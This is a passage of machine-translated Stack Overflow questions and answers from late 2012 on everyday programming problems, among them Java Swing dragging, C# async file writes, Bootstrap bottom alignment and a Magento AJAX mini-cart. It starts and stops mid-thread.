[http://graph.facebook.com/http://www.richardmarazziphoto.com/portfolios/yyz](http://graph.facebook.com/http://www.richardmarazziphoto.com/portfolios/yyz)

这将显示计数。如果您像以前那样使用斜线运行它，则不会。

我以为我解决了这个问题。它适用于我的旧页面，但新页面不起作用。

这是一个例子：

[http://graph.facebook.com/http://www.wpbeginner.com/beginners-guide/forgot-your-password-how-to-recover-a-lost-password-in-wordpress](http://graph.facebook.com/http://www.wpbeginner.com/beginners-guide/forgot-your-password-how-to-recover-a-lost-password-in-wordpress)

不知道FB最近在做什么。

# java - 如何提高图像拖动性能

> ID：13841363
> 
> 赞同：0
> 
> 时间：2012-12-12T13:55:33.970
> 
> 标签：java, swing, draggable

我正在尝试设置在 Jlabels 网格上拖动图像。它工作正常，但图像“刷新”，有时落后于鼠标。

有没有办法改善这一点并获得完美“平滑”的图像移动？

编辑：好的，感谢 Andrew Thompson 的建议，我将paint() 方法更新为paintComponent()。但是现在为什么我拖动它时我的组件消失了？我可能在这里遗漏了一些东西......

EDIT2：为什么会出现以下行为：使用 paint() 方法时，组件显示在 JLabels 之上。但是当使用paintComponent() 时，组件会被不透明的Jlabels 掩盖而消失吗？

```
import java.awt.*;  
import java.awt.event.*;  
import java.io.*;  
import java.net.*;  

import javax.imageio.ImageIO;  
import javax.swing.*;  
import javax.swing.event.*;  

public class DragNDrop {

    public static void main(String[] args)  
    {  
        JFrame f = new JFrame("Test");  
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);  
        f.setContentPane(new DragPanel());    
        f.pack();
        f.setLocation(200,200);  
        f.setVisible(true);  
    }  

}

class DragPanel extends JPanel {

    JLabel[][] labels;

    SelectableAction action;  
    Image image;  
    Point p;  

    public DragPanel()  
    {  

        p = new Point();  

        setOpaque(true);   
        createLabels();

        action = new SelectableAction(this);  
        addMouseListener(action);  
        addMouseMotionListener(action);  
    }  

    private void createLabels() {

            labels = new JLabel[8][8];

            Dimension dim50 = new Dimension(50,50);
            GridBagConstraints gbc = new GridBagConstraints();
            this.setLayout(new GridBagLayout());

            for (int x=0;x<8;x++){

                for (int y=0;y<8;y++){

                    labels[x][y] = new JLabel();
                    labels[x][y].setOpaque(true);
                    labels[x][y].setPreferredSize(dim50);
                    String str = new String("("+x+","+y+")");
                    labels[x][y].setText(str);

                    if ((x+y) % 2 == 0){
                        labels[x][y].setBackground(Color.lightGray);
                    } else
                    {
                        labels[x][y].setBackground(Color.white);
                    }

                    gbc.gridx = x;
                    gbc.gridy = 7-y;
                    this.add(labels[x][y],gbc);

                }
                URL url = getClass().getResource("images/50px-Knight.pgn");  
                Image img;
                try {
                    img = ImageIO.read(url);
                    labels[0][0].setIcon(new ImageIcon(img));
                } catch (IOException e) {

                    e.printStackTrace();
                }  

            }
    }

    public JLabel[][] getLabels()  
    {  
        return labels;  
    }  

    public void paintComponent(Graphics g)  
    {  
        super.paintComponent(g);  

        if(action.dragging)  
            g.drawImage(image, p.x, p.y, this); 

    }  

    public void setImage(Image i)  
    {  
        image = i;  
    }  

    public void setOrigin(Point p)  
    {  
        this.p = p;  
        repaint();  
    }  

}

/** 
 * Mouse code to enable image dragging 
 */  
class SelectableAction extends MouseInputAdapter  
{  
    DragPanel MyPanel;  
    Image selectedImage;  
    boolean dragging;  
    Rectangle r;  
    Point offset;  

    public SelectableAction(DragPanel dp)  
    {  
        MyPanel = dp;   
        dragging = false;  
        offset = new Point();  
    }  
    public void mousePressed(MouseEvent e)  
    {  
        Point p = e.getPoint();  
        JLabel[][] labels = MyPanel.getLabels();  
        for(int i = 0; i < labels.length; i++)  
        {  
            for (int j=0;j<labels[0].length;j++){

                r = labels[i][j].getBounds();  
                if(r.contains(p))  
                {  
                    if ( ((ImageIcon)labels[i][j].getIcon()).getImage() != null) {
                    selectedImage = ((ImageIcon)labels[i][j].getIcon()).getImage();  
                    MyPanel.setImage(selectedImage);  
                    labels[i][j].setIcon(null);
                    offset.x = p.x - r.x;  
                    offset.y = p.y - r.y;  
                    dragging = true;  
                    MyPanel.setOrigin(new Point(r.x, r.y));
                    break;  
                    }
                }  

            }

        }  
    }  

    public void mouseReleased(MouseEvent e)  
    {  
        Point p = e.getPoint();  
        JLabel[][] labels = MyPanel.getLabels();  
        for(int i = 0; i < labels.length; i++)  
        {  
            for (int j=0;j<labels[0].length; j++){

                r = labels[i][j].getBounds();  
                if(r.contains(p))  {

                    ImageIcon tmpIcon = new ImageIcon(selectedImage);
                    labels[i][j].setIcon(tmpIcon);
                    MyPanel.repaint();  
                    dragging = false;

                }
            }
        }

    }  

    public void mouseDragged(MouseEvent e)  
    {  
        if(dragging)  
        {  
            r.x = e.getX() - offset.x;  
            r.y = e.getY() - offset.y;  
            MyPanel.setOrigin(new Point(r.x, r.y));  
        }  
    }  
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:10:40.413

+1 对 AndrewThompson 和 GuillaumePolet 的评论。尤其：

> 它消失了，因为您有不透明的子组件在上面绘制自己。

为了克服这个问题，我们不需要/想要覆盖，`paintComponent(..)`而是我们想要覆盖`paintChildren(..)`并调用`super.paintChildren(..)`我们的自定义代码。因此，所有组件都将在调用中绘制`super`，我们的图像将在之后绘制，从而使其在所有其他组件之上出现/可见。

用下面的代码替换覆盖`paintComponent`，它将起作用：

```
@Override
protected void paintChildren(Graphics g) {
    super.paintChildren(g);

    if (action.dragging) {
        g.drawImage(image, p.x, p.y, null);//also notice i use null and not this, unless the class you are using extends ImageObserver no need for this
    }
} 
```

# c# - 不允许对独立存储中的 CreateFile 的独立存储文件流进行操作

> ID：13841364
> 
> 赞同：6
> 
> 时间：2012-12-12T13:55:44.853
> 
> 标签：c#, windows-phone, windows-phone-8, isolatedstorage, isolatedstoragefile

我正在尝试使用以下代码在独立存储中创建一个文件，

```
IsolatedStorageFile storageFile = IsolatedStorageFile.GetUserStoreForApplication();
storageFile.CreateFile("Html\\index.html"); 
```

但我在做同样的事情时遇到了异常......这就是说。

> > System.IO.IsolatedStorage.IsolatedStorageException： 不允许对独立存储文件流进行操作

除此操作外，不执行任何操作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T15:23:06.887

您可能需要先创建`Html`目录。如果目录已经存在， [IsolatedStorageFile.CreateDirectory()](http://msdn.microsoft.com/en-us/library/system.io.isolatedstorage.isolatedstoragefile.createdirectory.aspx)会成功，你可以这样做

```
IsolatedStorageFile storageFile = IsolatedStorageFile.GetUserStoreForApplication();
storageFile.CreateDirectory("Html");
storageFile.CreateFile("Html\\index.html");
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-04T20:15:49.523

我有同样的问题，它是目录路径。

此代码用于写入文件。

```
IsolatedStorageFile myIsolatedStorage = IsolatedStorageFile.GetUserStoreForApplication();
    var folder = ApplicationData.Current.LocalFolder;
    string folderfilename = folder.Path + "\\" + fileName;
    try
    {
        StreamWriter writeFile = new StreamWriter(new IsolatedStorageFileStream(folderfilename, FileMode.OpenOrCreate, myIsolatedStorage));
        writeFile.WriteAsync(content);
        writeFile.Close();
    }
    catch (Exception ex)
    {
    } 
```

# sql - 没有日期函数的 SQL 日期有什么用？

> ID：13841365
> 
> 赞同：3
> 
> 时间：2012-12-12T13:55:47.470
> 
> 标签：sql, datetime, semantics, abstraction

我使用过各种 ORM 和数据库抽象，旨在使使用多个数据库（包括关系型和非关系型数据库）变得容易。更全面的解决方案通常会让您访问一些归结为实际 SQL 的日期函数（或其他任何东西，在非 SQL 数据库的情况下）。另一方面，这些抽象中的许多不提供对 SQL 函数的直接访问，并且您失去了直接处理日期的能力。相反，您应该使用上层语言（PHP、Python 等）来处理日期，最后只插入、选择、格式化日期。

所以我的问题是：如果 SQL 服务器永远不会对日期本身做任何事情，我最好只使用一个 int 并将纪元时间戳放入其中，或者数据库服务器“知道”它是一个日期是否有额外的价值?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T13:59:10.400

如果您使用日期，请将它们存储为日期。

这不仅使数据库和应用程序之间的转换更容易，而且当您需要根据日期执行任何操作时（您会这样做，否则*为什么*要存储日期？）。

也就是说，当您需要使用日期进行排序或查询时，您无需费力地重新转换为日期。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:31:52.410

除此之外`@Oded said`，如果您**从未使用过任何与日期相关的功能**，仍然存在一些问题；

*   目前，您`cannot store epoch timestamp in milliseconds into an INT`字段（溢出）。

*   没有毫秒的时间戳将在*INT*上溢出，`Tue Jan 19 2038 @ 03:14:08 GMT+0000 (GMT)`因为它将大于`2147483647`.

*   *但是*，整数需要 4 个字节，而日期时间需要 8 个字节。`You are better off 4 bytes if you are within above two limitations.`

# java - 如何在andengine中添加移动精灵的路径

> ID：13841369
> 
> 赞同：4
> 
> 时间：2012-12-12T13:55:57.603
> 
> 标签：java, android, andengine

我正在开发游戏直升机（[http://i1-games.softpedia-static.com/screenshots/Copter_1.jpg](http://i1-games.softpedia-static.com/screenshots/Copter_1.jpg)）。当你触摸屏幕时，你会向上走，否则你会向下走。所以你正在改变精灵的位置。

现在我想要一个我的精灵的路径，有人知道怎么做吗？以下是它的外观示例：

![小径](../Images/99b52bdc15e255f377b9a2074156da92.png)

中心线上的提示就足够了。如果您知道如何进行渐变，请告诉我！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:02:12.810

你需要粒子。您可以在[这里](http://code.google.com/p/andengineexamples/)查看或更好地[查看](https://github.com/nicolasgramlich/AndEngineExamples/tree/GLES2/src/org/andengine/examples)以下 3 个示例：

*   粒子系统简单示例
*   粒子系统酷示例
*   粒子系统Nexus示例

# ios - 关于在真实设备中安装 iOS 应用程序

> ID：13841370
> 
> 赞同：0
> 
> 时间：2012-12-12T13:56:08.277
> 
> 标签：ios, ios-simulator

我一直在修复我的应用程序以在真正的 iOS 设备上运行。我正在使用 Xcode 管理器。现在当我使用它时，它给了我这个错误：

> xcode 找不到安装此版本的软件映像

我的 iPhone 版本是：6.0.1
我的 Xcode 版本是：3.2.3

任何想法如何解决这个问题？我已经尝试重新插入电话，我还检查了其他开发人员提供的一些故障排除，但它不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:01:50.713

Xcode 3.2.3 大约在 iOS 4 出来时发布，因此它不支持 iOS 6。

实际版本是（至少）4.5.1

从 Mac App Store 或[此处](https://developer.apple.com/technologies/tools/)下载。

# c# - 为什么违反 FK 的 SqlException 不显示违反的值？

> ID：13841371
> 
> 赞同：1
> 
> 时间：2012-12-12T13:56:09.070
> 
> 标签：c#, sql, sql-server-2012

我正在批量插入一长串对象。比我执行提交。

它有时会因错误而失败（C#）

> `"The INSERT statement conflicted with the FOREIGN KEY constraint "FK_MyFK". The conflict occurred in database "DCDCommunity", table "MySchema.MyTable", column 'Id'.\r\nThe statement has been terminated."}
> System.Exception {System.Data.SqlClient.SqlException}`

现在，我是否必须编写一个程序来迭代我的数据文件以查找该值，或者我可以在异常中获取它吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:10:14.213

我无法回答“为什么？” 但我可以提供一个建议 - 在进行批量插入之前对您的数据进行一些预检查以确保外键有效，以及您可能*经常*遇到的任何其他数据问题 - 例如检查字符串长度以避免“字符串或二进制数据将被截断”错误，如评论中所述。

# actionscript-3 - 使用引用与 getChildByName()

> ID：13841373
> 
> 赞同：2
> 
> 时间：2012-12-12T13:56:17.027
> 
> 标签：actionscript-3

我想到了 2 种方法来指代某些视觉元素，例如电影剪辑。所以假设我有 b_mc (name="b") 躺在舞台上的 a_mc 内：第一种方法：

```
var mc:MovieClip = a_mc.b_mc 
```

第二种方法：

```
var mc:MovieClip = a_mc.getChildByName("b") 
```

我通常使用第一种方法。什么是选择第二种方法的好理由。有时它对我来说似乎没用，因为当动态使用时，命名电影剪辑需要额外的开销。

谢谢 V。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:47:36.683

如果您向影片剪辑动态添加内容，则需要 getChildByName。例如：

```
var mc1:MovieClip = new MovieClip();
var mc2:MovieClip = new MovieClip();
mc2.name = "foobar";
mc1.addChild(mc2);

trace(mc1.foobar); //undefined
trace(mc1["foobar"]); //undefined
trace(mc1.getChildByName("foobar")); //[object MovieClip] 
```

我通常在引用对象时使用 mc1["foobar"]，因为这样可以轻松处理诸如 mc1["foobar_" + i]; 之类的项目。

我很少使用 getChildByName，因为每当您尝试将某些内容作为影片剪辑/文本字段或其他内容传递时，这都需要手动转换：)

但是，如果您确实从 Flash 编辑器创建实例，那么我通常会通过一些导出的类引用它们并通过 `mc1.mc2.mc3.optionsView.visible`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T17:24:11.623

`a.getChildByName('b')`比得到慢`a.b`。
如果您不需要使用名称，则使用它是没有意义的，但是一些程序员可能会使用名称，尤其是在动态生成内容而不是通过 Flash IDE 时，在这种情况下，使用此功能很有帮助，因此显示列表不必由自定义函数遍历（无论如何它与内部函数一起使用，因此它比 ab 慢）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:05:29.453

如果您有一个需要以编程方式处理的对象列表，那么 getChildByName 非常棒。它假设您还以某种编程方式命名它们以在 for 循环中重新索引它们。我还可以想到其他几种使用它的好方法，例如将名称或对象推送到数组中，这样它们就不必相关，只是都有一些共同的属性或方法。

```
for(var i:int = 0;i<numOfMC;i++) {
    theParent.getChildByName("child"+i).doSomething();
} 
```

# matplotlib - 拉伸轴刻度以适应压缩图像

> ID：13841378
> 
> 赞同：1
> 
> 时间：2012-12-12T13:56:34.553
> 
> 标签：matplotlib, axis, stretching

我有一个 PyQt4 应用程序，我在其中使用 matplotlib 表示一个 16 位灰度图像。我代表的图像非常大。由于内存限制，不幸的是我无法表示更大的图像，所以我以这种方式对它们进行切片：

```
ImageDataArray[::ratio, ::ratio] 
```

显示绘图时，轴会根据比率进行压缩。因此，图像的坐标对于了解感兴趣的信息的位置很重要，我想通过比率因子再次拉伸轴。

我该如何管理它，即使我使用 matplotlib 工具栏中的缩放功能，也会显示正确的坐标？

提前致谢。

代码：

```
from numpy import fromfile, uint16, shape
import matplotlib.pyplot as plt

data = fromfile('D:\\ImageData.raw', dtype=uint16)
data.resize((ysize,xsize))
xmin = 0
ymin = 0
xmax = shape(data)[1]
ymax = shape(data)[0]
ratio = max(max(shape(data)[0], shape(data)[1])/2000, 1)
data_slice = data[ymin:ymax:ratio, xmin:xmax:ratio]
fig = plt.figure(1)
ax = fig.add_subplot(111)
ax.imshow(data_slice, cmap='gray', interpolation='nearest')
plt.show() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:42:18.820

您想使用`imshow` [(doc)的范围关键字参数](http://matplotlib.org/api/pyplot_api.html#matplotlib.pyplot.imshow)

```
ax.imshow(...,extent=[xmin,xmax,ymin,ymax]) 
```

# c# - FileStream WriteAsync 和 await 混淆

> ID：13841381
> 
> 赞同：6
> 
> 时间：2012-12-12T13:56:52.347
> 
> 标签：c#, .net, filestream, async-await

我正在查看 C# 中的新关键字`async`和`await`关键字，并试图了解它们。

我正在查看 MSDN`FileStream.WriteAsync()` [示例](http://msdn.microsoft.com/en-us/library/hh158629.aspx)，但我不确定我是否理解某些内容。

示例如下：

```
using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.IO;

namespace WpfApplication1
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private async void Button_Click(object sender, RoutedEventArgs e)
        {
            UnicodeEncoding uniencoding = new UnicodeEncoding();
            string filename = @"c:\Users\exampleuser\Documents\userinputlog.txt";

            byte[] result = uniencoding.GetBytes(UserInput.Text);

            using (FileStream SourceStream = File.Open(filename, FileMode.OpenOrCreate))
            {
                SourceStream.Seek(0, SeekOrigin.End);
                await SourceStream.WriteAsync(result, 0, result.Length);
            }
        }
    }
} 
```

我没有得到的是`await`. 似乎您不能接受`Task`返回的项目，`WriteAsync()`因为这总是给我一个语法错误。所以我可以编译它的唯一方法是留下`await`调用。

但是如果你这样做，它不等待调用完成吗？这使得它不是很异步......

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-12T14:01:18.550

我怀疑问题出在您对功能的理解`await`上。

> 但是如果你这样做，它不等待调用完成吗？这使得它不是很异步......

当你`await`做某事时，你“异步阻塞” - 当异步操作完成时，你的异步函数将继续，但立即调用将立即完成。

因此，在您的情况下，UI线程因为返回而变得畅通`Button_Click`，但是当文件写入操作完成时，执行将返回（仍在UI线程中）到`await`表达式的末尾...然后您将关闭`FileStream`并完成异步函数。

*如果您在表达式之后*执行其他操作`await`（例如更新 UI），将会更清楚发生了什么。但是，是的，它确实*是*异步的——它只允许您编写*看起来*是同步的代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:06:10.633

await 在等待时实际上并没有阻塞。发生的事情是编译器做了一些复杂的事情来在等待之后对所有代码进行所谓的延续，并告诉任务在完成时执行该延续。

基本上 Button_Click 方法的最后几行被翻译成：

```
FileStream SourceStream = File.Open(filename, FileMode.OpenOrCreate);
SourceStream.Seek(0, SeekOrigin.End);
Task t = SourceStream.WriteAsync(result, 0, result.Length);
t.ContinueWith(_ => SourceStream.Dispose()); 
```

当然，这是简化的，因为例如，如果 WriteAsync 立即完成，这将更有效地执行。

# java - 让标签图标出现在文本上方

> ID：13841383
> 
> 赞同：1
> 
> 时间：2012-12-12T13:56:56.210
> 
> 标签：java, image, swing, jlabel, imageicon

我试图让`JLabel`图标出现在标签的文本上方。

目前我有以下代码；

```
URL loc = null;
        ImageIcon img = null;
        JLabel label = null;

        frame = new JFrame();
        frame.setBounds(100, 100, 450, 300);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.getContentPane().setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));

        loc = Test.class.getResource("/Images/imageName.jpg");
        img = new ImageIcon(loc);
        label = new JLabel("someText", img, JLabel.CENTER);
        label.setIconTextGap(0);
        label.setVerticalTextPosition(JLabel.BOTTOM);
        label.setHorizontalTextPosition(JLabel.RIGHT);
        frame.getContentPane().add(label); 
```

我目前看到的输出是图像图标右侧的标签文本。任何人都可以建议改变什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:03:30.560

```
label.setVerticalTextPosition(JLabel.BOTTOM);
label.setHorizontalTextPosition(JLabel.CENTER); 
```

您需要在水平轴上居中对齐，文本才能显示在图标下方。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:10:40.640

![下方带有文字的图标](../Images/33f4eddb8fb9005dca839e655a628305.png)

```
import java.awt.image.BufferedImage;
import javax.swing.*;

public class TopLabel {

    public static void main(String[] args) throws Exception {
        Runnable r = new Runnable() {

            @Override
            public void run() {
                JLabel label = new JLabel("Text");

                BufferedImage image = new BufferedImage(
                        32,32,BufferedImage.TYPE_INT_RGB);
                label.setIcon(new ImageIcon(image));

                label.setVerticalTextPosition(SwingConstants.BOTTOM);
                label.setHorizontalTextPosition(SwingConstants.CENTER);

                JOptionPane.showMessageDialog(null, label);
            }
        };
        // Swing GUIs should be created and updated on the EDT
        // http://docs.oracle.com/javase/tutorial/uiswing/concurrency/initial.html
        SwingUtilities.invokeLater(r);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:32:25.973

IIUC，并且您想在图像/图标内部（中间）显示文本，然后您可以选择使用[`Graphics.drawString()`](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/Graphics.html#drawString%28java.lang.String,%20int,%20int%29)在图像内部绘制文本。

```
BufferedImage bimg = ImageIO.read(url);
Graphics2D g = (Graphics2d)img.getGraphics();
g.drawString("Text", x, y); //y > 0
g.dispose();

JLabel label = new JLabel();
label.setIcon(new ImageIcon(bimg)); 
```

# html - 是否可以在 a 中使用标签 标签？

> ID：13841386
> 
> 赞同：11
> 
> 时间：2012-12-12T13:57:12.193
> 
> 标签：html, anchor, pre

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-12T14:01:26.250

# html - 如何在引导流体布局中底部对齐网格元素

> ID：13841387
> 
> 赞同：125
> 
> 时间：2012-12-12T13:57:13.627
> 
> 标签：html, css, layout, twitter-bootstrap

我使用 Twitter 的引导程序有一个流畅的布局，其中我有一排有两列。第一栏内容很多，我想正常填满span。第二列只有一个按钮和一些文本，我想相对于第一列中的单元格底部对齐。

这是我所拥有的：

```
-row-fluid-------------------------------------
+-span6----------+ +-span6----------+
|                | |short content   |
| content        | +----------------+
| that           | 
| is tall        |    
|                |
+----------------+
----------------------------------------------- 
```

这就是我想要的：

```
-row-fluid-------------------------------------
+-span6----------+
|                |
| content        |
| that           | 
| is tall        | +-span6----------+    
|                | |short content   |
+----------------+ +----------------+
----------------------------------------------- 
```

我已经看到了使第一个跨度成为绝对高度并相对于它定位第二个跨度的解决方案，但是我不必指定我的 div 的绝对高度的解决方案将是首选。我也愿意重新思考如何达到同样的效果。我不喜欢这种脚手架的使用，它对我来说似乎是最有意义的。

**这个布局就像一个小提琴：**

[http://jsfiddle.net/ryansturmer/A7buv/3/](http://jsfiddle.net/ryansturmer/A7buv/3/)

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2015-01-28T18:51:19.817

这是仅使用 CSS/LESS 的 Bootstrap 3（应该适用于旧版本）的更新解决方案：

[http://jsfiddle.net/silb3r/0srp42pb/11/](http://jsfiddle.net/silb3r/0srp42pb/11/)

您将行上的字体大小设置为 0（否则您最终会在列之间出现令人讨厌的空间），然后删除列浮动，将显示设置为`inline-block`，重新设置其字体大小，然后`vertical-align`可以设置为你需要的任何东西。

不需要 jQuery。

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2013-01-08T20:36:37.143

请注意：**对于 Bootstrap 4+ 用户，请考虑[Christophe 的解决方案](https://stackoverflow.com/a/34982317/1430996)**（Bootstrap 4 引入了 flexbox，它提供了更优雅的纯 CSS 解决方案）。以下内容适用于较早版本的 Bootstrap ...

* * *

有关可行的解决方案，请参见[http://jsfiddle.net/jhfrench/bAHfj/](http://jsfiddle.net/jhfrench/bAHfj/)。

```
//for each element that is classed as 'pull-down', set its margin-top to the difference between its own height and the height of its parent
$('.pull-down').each(function() {
  var $this = $(this);
  $this.css('margin-top', $this.parent().height() - $this.height())
}); 
```

从积极的一面：

*   本着[Bootstrap 现有辅助类](http://getbootstrap.com/2.3.2/components.html#misc)的精神，我将这个类命名为`pull-down`。
*   只有被“拉下”的元素需要被分类，所以......
*   ...它可重复用于不同的元素类型（div、span、section、p 等）
*   它得到了很好的支持（所有主流浏览器都支持 margin-top）

现在坏消息：

*   它需要 jQuery
*   它不是，书面的，响应式的（对不起）

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2016-01-24T22:29:14.940

您可以使用弹性：

```
@media (min-width: 768px) {
  .row-fluid {
    display: flex;
    align-items: flex-end;
  }
} 
```

* * *

## 回答 #4

> 赞同：27
> 
> 时间：2012-12-12T15:04:17.977

您需要为`span6`, smthg 添加一些样式，如下所示：

```
.row-fluid .span6 {
  display: table-cell;
  vertical-align: bottom;
  float: none;
} 
```

这是你的小提琴：http: [//jsfiddle.net/sgB3T/](http://jsfiddle.net/sgB3T/)

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2014-08-12T05:21:59.137

这里还有一个 angularjs 指令来实现这个功能

```
 pullDown: function() {
      return {
        restrict: 'A',
        link: function ($scope, iElement, iAttrs) {
          var $parent = iElement.parent();
          var $parentHeight = $parent.height();
          var height = iElement.height();

          iElement.css('margin-top', $parentHeight - height);
        }
      };
    } 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2017-07-08T14:46:58.750

只需将父级设置为`display:flex;`，将子级设置为`margin-top:auto`. 这会将子内容放置在父元素的底部，假设父元素的高度大于子元素。

`margin-top`当您的父元素或另一个元素的高度大于父元素中您感兴趣的子元素时，无需尝试计算值。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2013-07-31T01:24:15.463

根据此处的其他答案，这是一个响应速度更快的版本。我对 Ivan 的版本进行了更改，以支持 <768px 宽的视口并更好地支持慢速调整窗口大小。

```
!function ($) { //ensure $ always references jQuery
    $(function () { //when dom has finished loading
        //make top text appear aligned to bottom: http://stackoverflow.com/questions/13841387/how-do-i-bottom-align-grid-elements-in-bootstrap-fluid-layout
        function fixHeader() {
            //for each element that is classed as 'pull-down'
            //reset margin-top for all pull down items
            $('.pull-down').each(function () {
                $(this).css('margin-top', 0);
            });

            //set its margin-top to the difference between its own height and the height of its parent
            $('.pull-down').each(function () {
                if ($(window).innerWidth() >= 768) {
                    $(this).css('margin-top', $(this).parent().height() - $(this).height());
                }
            });
        }

        $(window).resize(function () {
            fixHeader();
        });

        fixHeader();
    });
}(window.jQuery); 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2016-06-21T15:46:12.610

这是基于 cfx 的解决方案，但不是在父容器中将字体大小设置为零以删除由于 display: inline-block 而添加的列间空格并且必须重置它们，我只是添加了

```
.row.row-align-bottom > div {
    float: none;
    display: inline-block;
    vertical-align: bottom;
    margin-right: -0.25em;
}
```

到列 div 进行补偿。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-11-25T09:08:43.703

好吧，我不喜欢这些答案中的任何一个，我对同一问题的解决方案是添加以下内容：`<div>&nbsp;</div>`. 因此，在您的方案中，它看起来像这样（或多或少），在我的情况下不需要更改样式：

```
-row-fluid-------------------------------------
+-span6----------+ +----span6----------+
|                | | +---div---+       |
| content        | | | & nbsp; |       |
| that           | | +---------+       |
| is tall        | | +-----div--------+|   
|                | | |short content   ||
|                | | +----------------+|
+----------------+ +-------------------+
----------------------------------------------- 
```

* * *

## 回答 #10

> 赞同：-3
> 
> 时间：2016-07-08T21:31:02.253

```
.align-bottom {
    position: absolute;
    bottom: 10px;
    right: 10px;
} 
```

# magento - 将产品添加到购物篮时切换下拉迷你购物车

> ID：13841390
> 
> 赞同：2
> 
> 时间：2012-12-12T13:57:20.990
> 
> 标签：magento, jquery

我在 Magento 商店的标题中放置了一个 jQuery 下拉迷你购物车。当“您的购物车”链接悬停时，下拉菜单会显示最近添加的项目。

我现在已经集成了 Ajax 添加到购物车扩展，它允许客户在不刷新页面的情况下添加到购物车。我现在遇到的问题是，添加产品时，如果不将鼠标悬停在“您的购物车”链接上，就无法判断。

我希望能够在添加产品时自动下拉迷你购物车，但我不知道该怎么做？

有人可以给我一些建议吗？

提前致谢！

Ajax 代码添加到购物车：

```
 <script type="text/javascript">
    //<![CDATA[
        var productAddToCartForm = new VarienForm('product_addtocart_form');
        productAddToCartForm.submit = function(button, url) {
        if (this.validator.validate()) {
            var form = this.form;
            var oldUrl = form.action;
            if (url) {
                form.action = url;
            }
            var e = null;
            // Start of our new ajax code
            if (!url) {
                url = jQuery('#product_addtocart_form').attr('action');
            }
            url = url.replace("checkout/cart","ajax/index"); // New Code
            var data = jQuery('#product_addtocart_form').serialize();
            data += '&isAjax=1';
            jQuery('#ajax_loader').show();
            try {
                jQuery.ajax( {
                    url : url,
                    dataType : 'json',
                    type : 'post',
                    data : data,
                    success : function(data) {
                        jQuery('#ajax_loader').show();
                        //alert(data.status + ": " + data.message);
                        if(jQuery('.block-cart')){
                            jQuery('.block-cart').replaceWith(data.sidebar);
                        }
                        if(jQuery('.header .links')){
                            jQuery('.header .links').replaceWith(data.toplink);
                        }
                    }
                });
            } catch (e) {
            }
            // End of our new ajax code
            this.form.action = oldUrl;
            if (e) {
                throw e;
            }
        }
    }.bind(productAddToCartForm);
    productAddToCartForm.submitLight = function(button, url){
            if(this.validator) {
                var nv = Validation.methods;
                delete Validation.methods['required-entry'];
                delete Validation.methods['validate-one-required'];
                delete Validation.methods['validate-one-required-by-name'];
                if (this.validator.validate()) {
                    if (url) {
                        this.form.action = url;
                    }
                    this.form.submit();
                }
                Object.extend(Validation.methods, nv);
            }
        }.bind(productAddToCartForm);
    //]]>
    </script>

And code for Mini-Cart:

function slideUp()
{
    jQuery('#topCartContent:visible').slideUp(1000);
    jQuery('.top-link-cart').addClass('mini-cart-layer-up');
    jQuery('.top-link-cart').removeClass('mini-cart-layer-down');
}

function slideDown()
{
    jQuery('#topCartContent:hidden').slideDown(1000);
    /*startTimer()*/ /* optional*/
    jQuery('.top-link-cart').addClass('mini-cart-layer-down');
    jQuery('.top-link-cart').removeClass('mini-cart-layer-up');
}

function toggleTopCart()
{
    if(jQuery('#topCartContent').is(':visible'))
    {
        slideUp();
    } else {
        slideDown();
    }
}

var timer;
function startTimer()
{
    timer = setTimeout(function(){
        slideUp();
    }, 5000);
}

jQuery(document).ready(function(){
    jQuery('.top-link-cart').mouseover(function(){
        toggleTopCart();
    });

    jQuery('.top-link-cart').mouseover(function(){
        clearTimeout(timer);
    }).mouseout(function(){
        startTimer();
    });

    jQuery("#topCartContent").mouseover(function() {
        clearTimeout(timer);
    }).mouseout(function(){
        startTimer();
    });
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T14:20:23.773

如果你使用 jQuery slideDown()、-Up() 或 -Toggle()，你会注意到一个动画故障（也就是一个垂直移动的图层一秒钟）。

所以我所做的很简单：

```
if ( $('.messages .success-msg').length ) {

    $('.messages').css('display','none'); // 'disable' default messages on top of content

    function showCartForASecOrThreeAndAHalf() {
        $('#mini-cart .menu').css('display','block');
        setTimeout(function () { $('#mini-cart .menu').css('display',''); }, 3500); // display:'' to restore previous settings
        }

        showCartForASecOrThreeAndAHalf();
} 
```

希望这可以帮助您进一步;-)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-03-04T07:55:30.873

这非常简单，但是我在浪费了几个小时后才学会了这一点（实际上并没有浪费）

创建一个观察者来观察产品何时添加到购物车。

配置文件

```
